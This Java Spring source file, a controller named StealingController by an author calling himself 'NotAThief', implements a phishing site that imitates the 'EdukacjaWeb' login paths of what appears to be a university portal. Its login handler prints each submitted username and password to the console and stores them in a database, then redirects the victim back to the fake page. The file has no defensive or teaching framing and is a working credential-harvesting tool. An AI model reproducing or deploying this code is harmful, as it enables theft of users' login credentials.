package com.test;


import org.apache.catalina.servlet4preview.http.HttpServletRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * Created by NotAThief on 03/12/2016.
 */

@Controller
public class StealingController {

    @Autowired
    public UserRepository repository;

    @RequestMapping(value = "/", method = RequestMethod.GET)
    public void redirect(HttpServletResponse response, HttpServletRequest request) throws IOException {
        response.sendRedirect(request.getContextPath() + "/EdukacjaWeb/studia.do");
    }

    @RequestMapping(value = "/EdukacjaWeb/studia.do", method = RequestMethod.GET)
    public String index(HttpServletResponse response, HttpServletRequest request) throws IOException {
        return "/index.html";
    }

    @RequestMapping(value = "/EdukacjaWeb/logInUser.do")
    public void loginUser(@RequestParam("login") String login, @RequestParam("password") String password, HttpServletResponse response, HttpServletRequest request) throws IOException {
        System.out.println("Login: "+login);
        System.out.println("Password: "+password);

        repository.save(new User(login,password));
        response.sendRedirect(request.getContextPath() + "/EdukacjaWeb/studia.do");


    }
}
